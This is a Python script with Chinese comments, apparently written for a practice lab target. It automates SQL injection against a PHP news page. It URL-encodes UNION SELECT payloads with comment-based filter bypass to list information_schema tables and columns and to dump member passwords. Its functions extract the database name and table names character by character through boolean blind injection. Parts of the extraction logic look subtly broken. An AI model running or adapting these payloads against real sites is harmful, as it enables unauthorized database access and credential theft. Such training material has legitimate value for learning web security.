import requests
import re
import os
import urllib.parse

zm = {
    '/':'%2F',
    "'":'%27',
    '(':'%28',
    ')':'%29',
    '*':'%2A',
    '+':'%2B',
    ',':'%2C',
    '=':'%3D',
    ' ':'%20',
    'a':'%61',
    'b':'%62',
    'c':'%63',
    'd':'%64',
    'e':'%65',
    'f':'%66',
    'g':'%67',
    'h':'%68',
    'i':'%69',
    'j':'%6a',
    'k':'%6b',
    'l':'%6c',
    'm':'%6d',
    'n':'%6e',
    'o':'%6f',
    'p':'%70',
    'q':'%71',
    'r':'%72',
    's':'%73',
    't':'%74',
    'u':'%75',
    'v':'%76',
    'w':'%77',
    'x':'%78',
    'y':'%79',
    'z':'%7a',
    '1':'%31',
    '0':'%30',
    '2':'%32',
    '3':'%33',
    '4':'%34',
    '5':'%35',
    '6':'%36',
    '7':'%37',
    '8':'%38',
    '9':'%39',
    '_':'%5F',
    '.':'%2E',
    '-':'%2D',
    '>':'%3e',
    '@':'%40',
    '}':'%7D',
    '{':'%7B',
}
#url = '/**/union/**/select/**/1,2,3,4'
#url = '/**/union/**/select/**/1,2,database(),4'
#url = "/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'mozhe_discuz_stormgroup'),4"
#url = "/**/union/**/select/**/1,2,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'stormgroup_member'),4"
#url = "/**/union/**/select/**/1,2,(select/**/group_concat(password)/**/from/**/stormgroup_member),4" 
#url = '/**/and/**/length(database())>0'
def tuISO8859():
    url = '/**/union/**/select/**/1,2,3,4/**/--+'
    urlcode = ''
    for u in url:
        urlcode += zm[u]
    print(urlcode)


           

# mozhe_discuz_stormgroup

# stormgroup_member
# (select group_concat(columns_name) from information_schema.columns where table_name =())


# #本次所需要用到的SQL
# 
# 
# sql_tables_name = " and ascii(substr((select table_name from information_schema.tables where table_schema = 'stormgroup' limit {index},1),{index1},1)) = "
rex = "关于平台停机维护的通知" #用于检测页面是否返回正常
x = 97 #a
all = 32
#检测页面是否返回正常
def jc(payload,rex):
    print(payload)
    r = requests.get(payload)
    result = re.findall(rex,r.text)
    if len(result) == 1:
        return 1
    return 0

#检测数据库长度
def jc_database_length(payload):
    for i in range(0,99):
        if jc(payload+str(i),rex):
            return i

#检测数据库名称
def jc_database_name(payload):
    database_name = ''
    for i in range(1,100):
        for index in range(0,95):
            if jc(payload.replace("{index}",str(i))+str(index+all),rex):
                print(chr(index+all))
                database_name+=chr(index+all)
                break
            if index == 94:
                return database_name       
    return database_name
#检测数据库表
def jc_table_name(payload):
    table_name = ''
    for i in range(2,100):
        for index in range(0,95):
            print(payload.replace("{index1}",str(i))+str(index+all))
            if jc(payload.replace("{index1}",str(i))+str(index+all),rex):
                table_name+=chr(index+x)
                break
            if index == 94:
                return table_name
    return table_name

def getTableNameList(payload):
    tableNameList = []
    for i in range(1,50):
        tableName = jc_table_name(payload.replace("{index}",str(i)))
        tableNameList.append(tableName)
        if tableName == '':
            return tableNameList
    return tableNameList
url = "http://219.153.49.228:40599/new_list.php?id=1"
sql_database_length = "/**/and/**/length(database())="
sql_database_name = "/**/and/**/ascii(substr(database(),{index},1))="
sql_tables_name = "/**/and/**/ascii((substr(select/**/table_name/**/from/**/information_schema.tables/**/limit/**/{index},1),{index},1))="

# databaseLength = jc_database_length(url+sql_database_length)
# print("数据库名长度："+str(databaseLength))
# databaseName = jc_database_name(url+sql_database_name)
# print("数据库名："+databaseName) #mozhe_discuz_stormgroup
# tableNameList = getTableNameList(url+sql_tables_name)
# print("数据库表：")
# print(tableNameList)


